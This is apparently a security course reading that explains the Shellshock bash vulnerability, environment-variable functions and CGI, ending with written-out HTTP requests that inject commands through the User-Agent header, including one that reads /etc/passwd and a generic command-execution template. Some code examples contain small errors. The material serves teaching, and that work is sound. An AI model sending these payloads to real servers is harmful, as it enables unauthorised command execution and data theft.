# Shellshock
Shellshock is a serious vulnerability that allows attackers to execute arbitrary bash commands on vulnerable systems. Attackers can exploit this to read sensitive data, backdoor a system, open TCP connections...And potentially _anything_ else that Bash can do.

Shellshock affected millions of systems—security firms saw attackers exploit it millions of times just a few days after its disclosure. Most modern systems aren't vulnerable, but a surprising number of machines remain 

The first version of Shellshock was documented as CVE-2014-6271. Researchers took a magnifying class to the underlying issue and found a series of related bugs, such as CVE-2014-6277 and CVE-2014-6278. Shellshock is really a _family_ of vulnerabilities, sometimes collectively known as the "Bash bugs".

In the reading below, you'll study the background required to understand CVE-2014-6271. At the end of it, you will see an example of the kind of malformed HTTP request you will use in tonight's exploitation exercise.

## Bash Background
### Environment Variables
Recall that bash has built-in variables containing information about the system. These are called **environment variables**. One example is `$TERM`, which contains the name of your terminal.

  ```bash
  $ echo $TERM
    cygwin
  ```

Environment variables are important because every shell on the system can read them. In other words, there is always a `$TERM` variable, and every user sees the same thing (by default) when they run `echo $TERM`. 

You can create environment variables with the `export` keyword:

  ```bash
  # Add ~/custom_executables to PATH 
  $ export PATH="$PATH:'~/custom_executables'"
  ```

### Bash Functions
Thus far, you've used combinations of shell commands to accomplish complex tasks:

  ```bash
  # Get reverse sorted list of all IP addresses in UFW logs
  $ awk '{print $12}' /var/log/ufw.log | cut -d '=' -f 2 | uniq | sort -R
   117.197.243.41
   117.197.243.62 
   117.197.243.67 
  ```

Instead of typing this command every time you need it, you can use an **alias** to rename it:

  ```bash
  $ alias uniqueips="awk '{print $12}' /var/log/ufw.log | cut -d '=' -f 2 | uniq | sort -R"
  $ uniqueips
   117.197.243.41
   117.197.243.62 
   117.197.243.67 
  ```

This is convenient, but it doesn't allow you to run the same command on a different log file, like `/var/log/ufw.log.2`. You would want to be able to do:

  ```bash
  $ uniqueips /var/log/ufw.log.2
  ```

Unfortunately, you can't. Recall that we "hard-coded" the file `/var/log/ufw.log` when defining `uniqueips`. Aliases provide no way to change that filename on the command-line—you would just have to create a whole new alias.

FOr situations like thi, bash provides **functions**. Functions let you define commands that take filename arguments. The code below defines `uniqueips` as a function:

  ```bash
  function uniqueips () {
    awk '{print $12}' $1 | cut -d '=' -f 2 | uniq | sort -R
  }
  ```

The `function` keyword indicates you're defining a function. The braces contain the script you want to run. Note that the filename `/var/log/ufw.log` is _not_ hardcoded in this function—instead, it's been replaced with `$1`. 

You use this function like as follows:

  ```bash
  $ uniqueips /var/log/ufw.log
   117.197.243.41
   117.197.243.62 
   117.197.243.67 

  $ uniqueips /var/log/ufw.log.2
   112.197.243.41
   112.197.243.62 
   112.197.243.67 
  ```

Note that Bash allows you to export functions, just like normal variables. 
  - **Note**: You don't need to know more than this to understand Shellshock, but for more information on functions: <https://www.howtoforge.com/tutorial/linux-shell-scripting-lessons-5/>

### Functions via Environment Variables
Older versions of Bash (before 4.3) allowed users to export functions as environment variables with the following syntax:

  ```bash
  $ myfunction=() { echo "My function!"; }:
  $ myfunction
    My function!
  ```

All this means is that you could use this syntax to create "environent functions" that every shell could use, analogous to environment variables that every shell could see.

This "feature" was removed after Shellshock was discovered. You'll see why below.

You can also define a function that does nothing:

  ```bash
  $ myfunction=() { :; };
  $ my function
  ```

This seems pointless, and it is, but you'll need to know about it for Shellshock.

## Serving Web Pages

### Receiving HTTP Requests
Apache is a popular HTTP server. Recall that HTTP servers listen for HTTP requests, such as the one below.

  ```bash
  GET /index.html HTTP/1.1
  Host: example.com
  User-Agent: curl
  ConnectIon: keep-alive
  ```

When the Apache server receives this request, it will look for the file `index.html` in its root directory, and send it back to the client.

It's not common now, but some old servers would use Bash to serve websites using a mechanism called **CGI**, or the **Common Gateway Interface**.

### CGI 
CGI is a standard that lets a client ask a server to run a script. The server then sends the result of running that script in an HTTP response.
 
CGI is different from a "normal" HTTP request for a web page. When you request a file like `index.html`, the web server finds the file and sends it back to you. 

  ```bash
  # HTTP Request
  GET /index.html HTTP/1.1
  Host: example.com
  Connection: close

  # HTTP Response
  HTTP/1.1 200 OK
  Content-Type: text/html; charset=UTF-8
  Server: ECS (atl/FC95)
  Content-Length: 1270

  <!doctype html>
  <html>
  <head>
    <title>Example Domain</title>
     ... 
  ```

When you request a CGI script, the server instead _runs the script_, then sends back its output. CGI scripts are often kept in a directory called `/cgi-bin`.
 
Suppose you have the code below in a script at `/cgi-bin/sysinfo`:

  ```bash
  #!/bin/bash
  # Print OS and Kernel Version
  echo uname -a
  ```

Sending an HTTP request to this file does _not_ fetch the file contents. Instead, it causes the server to run the script, and send its results in an HTTP response. A client could run this script with:

  ```bash
  $ curl http://example.site/cgi-bin/sysinfo
    MINGW64_NT-10.0 DESKTOP-5M9HQ2I 2.11.2(0.329/5/3) 2018-11-10 14:38 x86_64 Msys    
  ```

CGI scripts often need to use information contained in HTTP headers. Consequently, servers that use CGI automatically load the value of certain HTTP headers when processing requests. For example, they store the `User-Agent` header in the environment variable `HTTP_USER_AGENT`.

The fact that CGI automatically loads headers as environment variables is what makes Shellshock possible.

### Exploiting Bash
Suppose an HTTP server receives the below request:

  ```bash
  GET /index.html HTTP/1.1
  Host: example.com
  User-Agent: curl
  ConnectIon: keep-alive
  ```

When Bash loads HTTP headers as environment variables, it simply sets those variables equal to the value of the corresponding HTTP header. For example:

  ```bash
  HTTP_HOST="example.com"
  HTTP_USER_AGENT="curl"
  ```

Recall that Bash allows you to define functions with the syntax below.

  ```bash
  myfunc="() { echo 'My function!'; };"
  ```

So, if you send the below request with Burp Repeater:

  ```bash
  GET /index.html HTTP/1.1
  Host: example.com
  User-Agent: () { :;};
  ConnectIon: keep-alive
  ```

...Then Bash will do:

  ```bash
  HTTP_USER_AGENT="() { :; };"
  ```

This results in Bash creating and exporting a _function_, called `HTTP_USER_AGENT`, because the value of the `User-Agent` header contained shell code.

Suppose you send the following request:

  ```bash
  GET /index.html HTTP/1.1
  Host: example.com
  User-Agent: () { :;}; /bin/bash -c 'cat /etc/passwd'
  ConnectIon: keep-alive
  ```

Upon receiving this request, Bash will do:

  ```bash
  HTTP_USER_AGENT="() { :;}; /bin/bash -c 'cat /etc/passwd'"
  ```

Older versions of bash would load `HTTP_USER_AGENT="() { :;}"` as a function, and then execute `/bin/bash -c 'cat/passwd'` as a command.

This means that you can run commands on servers vulnerable to Shellshock by sending the following HTTP payload:

  ```bash
  GET /index.html HTTP/1.1
  Host: example.com
  User-Agent: () { :;}; $CMD_TO_RUN
  ConnectIon: keep-alive
  ```